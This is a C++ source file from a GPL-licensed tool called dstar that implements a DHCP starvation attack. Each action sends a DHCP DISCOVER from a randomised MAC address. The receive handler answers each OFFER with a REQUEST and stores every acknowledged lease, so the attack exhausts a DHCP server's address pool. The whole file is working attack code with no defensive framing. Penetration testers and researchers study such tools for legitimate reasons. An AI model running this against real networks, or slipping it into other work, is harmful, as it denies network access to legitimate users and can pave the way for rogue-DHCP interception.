/*
	* dstar
	* Copyright (C) 2017 - 2018 Jacopo De Luca
	*
	* This program is free software: you can redistribute it and/or modify
	* it under the terms of the GNU General Public License as published by
	* the Free Software Foundation, either version 3 of the License, or
	* (at your option) any later version.
	* This program is distributed in the hope that it will be useful,
	* but WITHOUT ANY WARRANTY; without even the implied warranty of
	* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	* GNU General Public License for more details.
	* You should have received a copy of the GNU General Public License
	* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#include <iostream>
#include <cstring>
#include <sys/time.h>

#include <actions/Starvation.h>

Starvation::Starvation() {
    pthread_mutex_init(&this->mutex, nullptr);
    pthread_cond_init(&this->cond, nullptr);
}

Starvation::~Starvation() {
    pthread_mutex_destroy(&this->mutex);
    pthread_cond_destroy(&this->cond);
}

void Starvation::action(DhcpSocket *socket) {
    DhcpPacket dhcpPacket{};
    PacketInfo pktInfo{};
    timespec maxWaitCond{};
    netaddr_mac(req);
    int err;

    pthread_mutex_lock(&this->mutex);

    while (this->lastXid != 0) {
        timespec_get(&maxWaitCond, TIMER_ABSTIME);
        maxWaitCond.tv_sec += 10;
        if (pthread_cond_timedwait(&this->cond, &this->mutex, &maxWaitCond) == ETIMEDOUT)
            this->lastXid = 0;
    }

    eth_rndaddr(&req);
    eth_bcast(&pktInfo.phisAddr);
    pktInfo.ipDst.ip = 0xFFFFFFFF;
    pktInfo.toServer = true;

    dhcp_inject_discovery((unsigned char *) &dhcpPacket, &req, nullptr, DHCP_FLAGS_BROADCAST);
    if ((err = socket->sendDhcpMsg(&dhcpPacket, DHCPPKTSIZE, &pktInfo)) < 0)
        std::cerr << "Starvation action: " << spark_strerror(err) << std::endl;
    else
        std::cout << "\n[<---] DHCP DISCOVER" << std::endl;

    lastXid = dhcpPacket.xid;
    pthread_mutex_unlock(&this->mutex);
}

void Starvation::recvDhcpMsg(DhcpSocket *socket, DhcpPool *pool, PacketInfo *pktInfo, DhcpPacket *dhcp) {
    DhcpPacket packet{};
    DhcpSlot *slot;
    netaddr_mac(chaddr);
    char cIp[IPSTRLEN];
    char cMac[ETHSTRLEN];
    int err;

    pthread_mutex_lock(&this->mutex);

    if (dhcp->xid != this->lastXid) {
        pthread_mutex_unlock(&this->mutex);
        return;
    }

    memcpy(chaddr.mac, dhcp->chaddr, ETHHWASIZE);
    pktInfo->ipSrc.ip = dhcp->yiaddr;
    pktInfo->ipDst.ip = dhcp_get_option_uint(dhcp, DHCP_SERVER_IDENTIFIER);
    if (ip_isempty(&pktInfo->ipDst))
        pktInfo->ipDst.ip = dhcp->siaddr;
    pktInfo->toServer = true;

    if (dhcp_type_equals(dhcp, DHCP_OFFER)) {

        std::cout << "[--->] DHCP OFFER" << std::endl;
        dhcp_inject_request((unsigned char *) &packet,
                            &chaddr,
                            &pktInfo->ipSrc,
                            this->lastXid,
                            &pktInfo->ipDst,
                            DHCP_FLAGS_BROADCAST);
        if ((err = socket->sendDhcpMsg(&packet, DHCPPKTSIZE, pktInfo)) < 0)
            std::cerr << "Starvation action(request): " << spark_strerror(err) << std::endl;
        else
            std::cout << "[<---] DHCP REQUEST" << std::endl;
    } else if (dhcp_type_equals(dhcp, DHCP_ACK)) {
        slot = new DhcpSlot;
        slot->clientIp = pktInfo->ipSrc;
        memcpy(slot->clientMac.mac, dhcp->chaddr, ETHHWASIZE);
        slot->serverIp = pktInfo->ipDst;
        slot->serverMac = pktInfo->phisAddr;
        gettimeofday(&slot->timeStamp, nullptr);
        slot->lease = ntohl(dhcp_get_option_uint(dhcp, DHCP_ADDR_LEASE_TIME));

        std::cout << "[--->V] DHCP ACK\n\tIp:" << ip_getstr_r(&slot->clientIp, cIp)
                  << " - MAC:" << eth_getstr_r(&slot->clientMac, cMac)
                  << " lease(s):" << slot->lease << std::endl;

        pool->addSlot(slot);
        this->lastXid = 0;
        pthread_cond_signal(&this->cond);
    } else if (dhcp_type_equals(dhcp, DHCP_NAK))
        std::cout << "[--->X] DHCP NACK" << std::endl;
    pthread_mutex_unlock(&this->mutex);
}